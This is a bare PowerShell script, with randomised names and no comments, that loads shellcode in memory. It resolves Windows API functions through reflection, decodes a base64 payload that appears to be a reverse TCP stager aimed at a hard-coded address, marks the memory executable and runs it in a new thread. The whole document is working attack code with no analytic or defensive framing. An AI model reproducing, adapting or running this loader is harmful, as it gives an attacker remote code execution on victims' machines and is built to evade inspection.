function xY {
        Param ($ce, $w8QX8)
        $iX_ = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $iX_.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($iX_.GetMethod('GetModuleHandle')).Invoke($null, @($ce)))), $w8QX8))
}

function sD {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $yiQIi,
                [Parameter(Position = 1)] [Type] $bUa = [Void]
        )

        $qz = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $qz.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $yiQIi).SetImplementationFlags('Runtime, Managed')
        $qz.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $bUa, $yiQIi).SetImplementationFlags('Runtime, Managed')

        return $qz.CreateType()
}

[Byte[]]$h1kh = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSUVZlSItSYEiLUhhIi1IgSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGFBEi0AgSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVheWUgB0FpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCANQxwKgCL0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$oZ = 0
$ix = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xY kernel32.dll VirtualAlloc), (sD @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $h1kh.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($h1kh, 0, $ix, $h1kh.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xY kernel32.dll VirtualProtect), (sD @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($ix, [Uint32]$h1kh.Length, 0x10, [Ref]$oZ)) -eq $true) {
        $za = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xY kernel32.dll CreateThread), (sD @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$ix,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xY kernel32.dll WaitForSingleObject), (sD @([IntPtr], [Int32]))).Invoke($za,0xffffffff) | Out-Null
}
